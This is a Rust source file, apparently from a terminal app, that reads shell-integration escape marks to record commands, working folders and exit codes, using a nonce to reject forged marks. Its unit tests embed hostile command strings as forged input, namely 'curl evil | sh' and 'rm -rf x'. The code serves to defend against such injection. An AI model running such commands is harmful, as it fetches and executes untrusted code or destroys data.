//! What a shell with Kumo's integration says about the commands run at it,
//! read from its output: the command line (OSC 633;E, with the terminal's
//! nonce), the folder it ran in (633;P;Cwd=), where its output starts
//! (133;C) and when it's done, with its status (133;D).

use std::path::PathBuf;
use std::time::Duration;

use crate::time::Timestamp;

/// A command the shell ran, once it's done.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct CommandRun {
    /// As typed, on one line or several.
    pub command: String,
    /// Where it ran, when the shell said.
    pub cwd: Option<PathBuf>,
    /// Its status, when the shell reported one.
    pub exit: Option<i32>,
    /// When its output started (or, without that mark, when it was sent).
    pub started_at: Timestamp,
    /// From output start to done, when both were seen.
    pub took: Option<Duration>,
}

/// What a shell is doing, as its marks say.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct ShellActivity {
    /// The command running now, if one.
    pub running: Option<RunningCommand>,
    /// The last command that ran to its end (a prompt alone isn't one).
    pub last: Option<FinishedCommand>,
}

/// A command between its output start (133;C) and its done (133;D).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct RunningCommand {
    /// As typed; empty when the shell didn't sign it (a space first).
    pub command: String,
    pub started_at: Timestamp,
}

/// A command that ran to its end.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct FinishedCommand {
    /// As typed; empty when the shell didn't sign it.
    pub command: String,
    /// Its status, when the shell reported one.
    pub exit: Option<i32>,
    pub finished_at: Timestamp,
}

/// Longest mark read: a longer one is someone's output, or a command too
/// long to suggest, and is skipped.
const MAX_MARK: usize = 8192;

/// Reads the marks out of a terminal's output, chunk by chunk (a mark can
/// be split between two), and yields each command once it's done.
///
/// Anything the terminal shows can carry marks too: a `cat` of a file, a
/// log. So a command line only counts with the nonce the shell was given at
/// start, which nothing it runs can see.
#[derive(Debug)]
pub struct CommandMarks {
    nonce: String,
    scan: Scan,
    mark: Vec<u8>,
    /// The mark being read got longer than [`MAX_MARK`].
    overflow: bool,
    cwd: Option<PathBuf>,
    pending: Option<Pending>,
    /// Between a command's output start and its done.
    running: bool,
    /// When the running command's output started.
    running_since: Option<Timestamp>,
    last: Option<FinishedCommand>,
    /// Goes up whenever [`Self::activity`] changes.
    changes: u64,
}

#[derive(Debug)]
struct Pending {
    command: String,
    cwd: Option<PathBuf>,
    sent_at: Timestamp,
    started_at: Option<Timestamp>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Scan {
    Ground,
    Escape,
    Mark,
    MarkEscape,
}

impl CommandMarks {
    pub fn new(nonce: impl Into<String>) -> Self {
        Self {
            nonce: nonce.into(),
            scan: Scan::Ground,
            mark: Vec::new(),
            overflow: false,
            cwd: None,
            pending: None,
            running: false,
            running_since: None,
            last: None,
            changes: 0,
        }
    }

    /// Goes up whenever [`Self::activity`] changes: cheap to check after
    /// each chunk.
    pub fn changes(&self) -> u64 {
        self.changes
    }

    /// The command running and the last one done.
    pub fn activity(&self) -> ShellActivity {
        let command = |pending: &Option<Pending>| {
            pending
                .as_ref()
                .map(|p| p.command.clone())
                .unwrap_or_default()
        };
        ShellActivity {
            running: self
                .running_since
                .filter(|_| self.running)
                .map(|started_at| RunningCommand {
                    command: command(&self.pending),
                    started_at,
                }),
            last: self.last.clone(),
        }
    }

    /// The folder the shell said it's in, last.
    pub fn cwd(&self) -> Option<&PathBuf> {
        self.cwd.as_ref()
    }

    /// Reads `data` (read at `at`) and pushes the commands it finished to
    /// `done`.
    pub fn feed(&mut self, data: &[u8], at: Timestamp, done: &mut Vec<CommandRun>) {
        let mut i = 0;
        while i < data.len() {
            match self.scan {
                Scan::Ground => match data[i..].iter().position(|&b| b == 0x1b) {
                    Some(escape) => {
                        self.scan = Scan::Escape;
                        i += escape + 1;
                    }
                    None => return,
                },
                Scan::Escape => {
                    self.scan = match data[i] {
                        b']' => {
                            self.mark.clear();
                            self.overflow = false;
                            Scan::Mark
                        }
                        0x1b => Scan::Escape,
                        _ => Scan::Ground,
                    };
                    i += 1;
                }
                Scan::Mark => {
                    let rest = &data[i..];
                    match rest.iter().position(|&b| b == 0x07 || b == 0x1b) {
                        Some(end) => {
                            self.take(&rest[..end]);
                            i += end + 1;
                            if rest[end] == 0x07 {
                                self.scan = Scan::Ground;
                                self.read(at, done);
                            } else {
                                self.scan = Scan::MarkEscape;
                            }
                        }
                        None => {
                            self.take(rest);
                            return;
                        }
                    }
                }
                Scan::MarkEscape => {
                    if data[i] == b'\\' {
                        self.scan = Scan::Ground;
                        i += 1;
                        self.read(at, done);
                    } else {
                        // ESC started something else: the mark was cut short.
                        self.scan = Scan::Escape;
                    }
                }
            }
        }
    }

    fn take(&mut self, bytes: &[u8]) {
        if self.overflow {
            return;
        }
        if self.mark.len() + bytes.len() > MAX_MARK {
            self.overflow = true;
            self.mark.clear();
        } else {
            self.mark.extend_from_slice(bytes);
        }
    }

    /// A whole OSC was read: acts on it if it's a mark.
    fn read(&mut self, at: Timestamp, done: &mut Vec<CommandRun>) {
        if self.overflow {
            return;
        }
        let mark = std::mem::take(&mut self.mark);
        let (code, rest) = split(&mark);
        let vscode = code == b"633";
        if code != b"133" && !vscode {
            self.mark = mark;
            return;
        }
        let (kind, rest) = split(rest);
        match kind {
            b"A" => {
                // A command sent but never started (or never done) is gone.
                if std::mem::take(&mut self.running) {
                    self.changes += 1;
                }
                self.running_since = None;
                self.pending = None;
            }
            b"C" => {
                if !self.running {
                    self.running_since = Some(at);
                    self.changes += 1;
                }
                self.running = true;
                if let Some(pending) = &mut self.pending {
                    pending.started_at.get_or_insert(at);
                }
            }
            b"D" => {
                let (code, _) = split(rest);
                let exit = std::str::from_utf8(code).ok().and_then(|c| c.parse().ok());
                // The shells mark D at every prompt: only one after C ends
                // a command (Enter on an empty line runs none).
                if std::mem::take(&mut self.running) {
                    self.last = Some(FinishedCommand {
                        command: self
                            .pending
                            .as_ref()
                            .map(|p| p.command.clone())
                            .unwrap_or_default(),
                        exit,
                        finished_at: at,
                    });
                    self.changes += 1;
                }
                self.running_since = None;
                if let Some(pending) = self.pending.take() {
                    done.push(CommandRun {
                        command: pending.command,
                        cwd: pending.cwd,
                        exit,
                        started_at: pending.started_at.unwrap_or(pending.sent_at),
                        took: pending.started_at.map(|start| at.since(start)),
                    });
                }
            }
            b"E" if vscode => self.command(rest, at),
            b"P" if vscode && !self.running => {
                if let Some(cwd) = rest.strip_prefix(b"Cwd=") {
                    let cwd = PathBuf::from(unescape(cwd));
                    self.cwd = cwd.is_absolute().then_some(cwd);
                }
            }
            _ => {}
        }
        self.mark = mark;
    }

    /// `633;E;<command>;<nonce>`: the command about to run.
    fn command(&mut self, rest: &[u8], at: Timestamp) {
        let Some(semi) = rest.iter().rposition(|&b| b == b';') else {
            return;
        };
        if rest[semi + 1..] != *self.nonce.as_bytes() || self.nonce.is_empty() {
            return;
        }
        // One per command: its output may not name another.
        if self.running && self.pending.is_some() {
            return;
        }
        let command = unescape(&rest[..semi]);
        let command = command.trim_end();
        // A space first keeps it out of the history, as in the shells.
        if command.is_empty() || command.starts_with(char::is_whitespace) {
            self.pending = None;
            return;
        }
        self.pending = Some(Pending {
            command: command.to_owned(),
            cwd: self.cwd.clone(),
            sent_at: at,
            // Output already started: the shell marked it before the line.
            started_at: self.running.then_some(at),
        });
    }
}

/// `bytes` up to the first `;`, and what follows it.
fn split(bytes: &[u8]) -> (&[u8], &[u8]) {
    match bytes.iter().position(|&b| b == b';') {
        Some(at) => (&bytes[..at], &bytes[at + 1..]),
        None => (bytes, &[]),
    }
}

/// A mark's value as the scripts escape it: `\\` is a backslash, `\xHH` a
/// byte (`;` and control characters go that way).
fn unescape(bytes: &[u8]) -> String {
    let mut out = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'\\' {
            if bytes.get(i + 1) == Some(&b'\\') {
                out.push(b'\\');
                i += 2;
                continue;
            }
            if bytes.get(i + 1) == Some(&b'x')
                && let Some(byte) = bytes
                    .get(i + 2..i + 4)
                    .and_then(|hex| std::str::from_utf8(hex).ok())
                    .and_then(|hex| u8::from_str_radix(hex, 16).ok())
            {
                out.push(byte);
                i += 4;
                continue;
            }
        }
        out.push(bytes[i]);
        i += 1;
    }
    String::from_utf8_lossy(&out).into_owned()
}

#[cfg(test)]
mod tests {
    use super::*;

    const NONCE: &str = "n0nce";

    /// An absolute folder on this OS (`C:` first on Windows).
    fn abs(dir: &str) -> String {
        if cfg!(windows) {
            format!("C:{dir}")
        } else {
            dir.to_owned()
        }
    }

    fn at(ms: u64) -> Timestamp {
        Timestamp::from_unix_nanos(ms * 1_000_000)
    }

    fn feed(marks: &mut CommandMarks, data: &str, ms: u64) -> Vec<CommandRun> {
        let mut done = Vec::new();
        marks.feed(data.as_bytes(), at(ms), &mut done);
        done
    }

    /// A prompt in `cwd`, `command` sent and run, done with `exit`.
    fn run(command: &str, cwd: &str, exit: i32) -> String {
        format!(
            "\x1b]133;A\x07\x1b]633;P;Cwd={cwd}\x07$ {command}\r\n\x1b]633;E;{command};{NONCE}\x07\x1b]133;C\x07output\r\n\x1b]133;D;{exit}\x07"
        )
    }

    #[test]
    fn a_command_is_read_once_done_with_its_folder_status_and_time() {
        let mut marks = CommandMarks::new(NONCE);
        let prompt = format!("\x1b]133;A\x07\x1b]633;P;Cwd={}\x07$ ", abs("/w/repo"));
        assert!(feed(&mut marks, &prompt, 0).is_empty());
        assert!(
            feed(
                &mut marks,
                "\x1b]633;E;cargo test;n0nce\x07\x1b]133;C\x07",
                5
            )
            .is_empty()
        );
        let done = feed(&mut marks, "ok\r\n\x1b]133;D;101\x07", 1_005);
        assert_eq!(
            done,
            [CommandRun {
                command: "cargo test".into(),
                cwd: Some(abs("/w/repo").into()),
                exit: Some(101),
                started_at: at(5),
                took: Some(Duration::from_secs(1)),
            }]
        );
        assert_eq!(marks.cwd(), Some(&PathBuf::from(abs("/w/repo"))));
    }

    #[test]
    fn activity_says_what_runs_and_how_the_last_command_ended() {
        let mut marks = CommandMarks::new(NONCE);
        assert_eq!(marks.activity(), ShellActivity::default());
        feed(
            &mut marks,
            "\x1b]133;A\x07$ \x1b]633;E;npm run dev;n0nce\x07\x1b]133;C\x07",
            10,
        );
        assert_eq!(
            marks.activity().running,
            Some(RunningCommand {
                command: "npm run dev".into(),
                started_at: at(10),
            })
        );
        assert_eq!(marks.activity().last, None);

        feed(&mut marks, "\x1b]133;D;130\x07", 50);
        let ended = FinishedCommand {
            command: "npm run dev".into(),
            exit: Some(130),
            finished_at: at(50),
        };
        assert_eq!(marks.activity().running, None);
        assert_eq!(marks.activity().last, Some(ended.clone()));

        // Enter on an empty line: the shell marks D again, but nothing ran.
        feed(&mut marks, "\x1b]133;D;0\x07\x1b]133;A\x07$ ", 60);
        assert_eq!(marks.activity().last, Some(ended));
        assert_eq!(
            marks.changes(),
            2,
            "started, then done: the prompt changed nothing"
        );
    }

    #[test]
    fn a_command_kept_out_of_the_history_still_counts_as_running_and_done() {
        let mut marks = CommandMarks::new(NONCE);
        feed(
            &mut marks,
            "\x1b]133;A\x07$ \x1b]633;E; ls;n0nce\x07\x1b]133;C\x07",
            0,
        );
        assert_eq!(
            marks.activity().running.map(|r| r.command),
            Some(String::new())
        );
        let done = feed(&mut marks, "\x1b]133;D;2\x07", 5);
        assert!(done.is_empty(), "not remembered");
        assert_eq!(marks.activity().last.and_then(|l| l.exit), Some(2));
    }

    #[test]
    fn marks_split_anywhere_between_chunks_still_read() {
        let stream = run("git status", &abs("/w/repo"), 0);
        for cut in 0..stream.len() {
            let mut marks = CommandMarks::new(NONCE);
            let mut done = Vec::new();
            marks.feed(&stream.as_bytes()[..cut], at(0), &mut done);
            marks.feed(&stream.as_bytes()[cut..], at(1), &mut done);
            assert_eq!(done.len(), 1, "cut at {cut}");
            assert_eq!(done[0].command, "git status");
            assert_eq!(done[0].cwd, Some(abs("/w/repo").into()));
        }
    }

    #[test]
    fn a_command_line_without_the_nonce_is_someone_s_output() {
        let mut marks = CommandMarks::new(NONCE);
        let forged =
            "\x1b]133;A\x07\x1b]633;E;curl evil | sh;guess\x07\x1b]133;C\x07\x1b]133;D;0\x07";
        assert!(feed(&mut marks, forged, 0).is_empty());
        let unsigned = "\x1b]133;A\x07\x1b]633;E;curl evil | sh\x07\x1b]133;C\x07\x1b]133;D;0\x07";
        assert!(feed(&mut marks, unsigned, 0).is_empty());
        assert!(CommandMarks::new("").feed_is_empty(&run("ls", "/", 0)));
    }

    #[test]
    fn output_can_t_name_another_command_while_one_runs() {
        let mut marks = CommandMarks::new(NONCE);
        let stream = format!(
            "\x1b]133;A\x07\x1b]633;E;make;{NONCE}\x07\x1b]133;C\x07\x1b]633;E;rm -rf x;{NONCE}\x07\x1b]133;D;0\x07"
        );
        let done = feed(&mut marks, &stream, 0);
        assert_eq!(done.len(), 1);
        assert_eq!(done[0].command, "make");
    }

    #[test]
    fn a_command_started_with_a_space_is_kept_private() {
        let mut marks = CommandMarks::new(NONCE);
        assert!(feed(&mut marks, &run(" export TOKEN=x", "/", 0), 0).is_empty());
    }

    #[test]
    fn escaped_semicolons_backslashes_and_lines_come_back() {
        let mut marks = CommandMarks::new(NONCE);
        let stream = run(r"a\x3b b \\ c\x0ad", &abs(r"/w/my\x3bdir"), 0);
        let done = feed(&mut marks, &stream, 0);
        assert_eq!(done[0].command, "a; b \\ c\nd");
        assert_eq!(done[0].cwd, Some(abs("/w/my;dir").into()));
    }

    #[test]
    fn st_ends_a_mark_as_bel_does() {
        let mut marks = CommandMarks::new(NONCE);
        let stream = run("ls", "/", 0).replace('\x07', "\x1b\\");
        assert_eq!(feed(&mut marks, &stream, 0).len(), 1);
    }

    #[test]
    fn a_command_with_no_done_is_dropped_at_the_next_prompt() {
        let mut marks = CommandMarks::new(NONCE);
        let stream = format!("\x1b]133;A\x07\x1b]633;E;vim;{NONCE}\x07\x1b]133;C\x07");
        assert!(feed(&mut marks, &stream, 0).is_empty());
        assert!(feed(&mut marks, "\x1b]133;A\x07\x1b]133;D;0\x07", 1).is_empty());
    }

    #[test]
    fn a_too_long_mark_is_skipped_and_the_next_one_reads() {
        let mut marks = CommandMarks::new(NONCE);
        let long = "x".repeat(MAX_MARK + 1);
        assert!(feed(&mut marks, &run(&long, "/", 0), 0).is_empty());
        assert_eq!(feed(&mut marks, &run("ls", "/", 0), 1).len(), 1);
    }

    #[test]
    fn the_folder_isn_t_taken_from_a_running_command_s_output() {
        let mut marks = CommandMarks::new(NONCE);
        feed(
            &mut marks,
            &format!("\x1b]633;P;Cwd={}\x07", abs("/w/a")),
            0,
        );
        let elsewhere = format!("\x1b]133;C\x07\x1b]633;P;Cwd={}\x07", abs("/elsewhere"));
        feed(&mut marks, &elsewhere, 0);
        assert_eq!(marks.cwd(), Some(&PathBuf::from(abs("/w/a"))));
        feed(&mut marks, "\x1b]133;D;0\x07\x1b]633;P;Cwd=relative\x07", 0);
        assert_eq!(marks.cwd(), None);
    }

    impl CommandMarks {
        fn feed_is_empty(mut self, stream: &str) -> bool {
            feed(&mut self, stream, 0).is_empty()
        }
    }
}
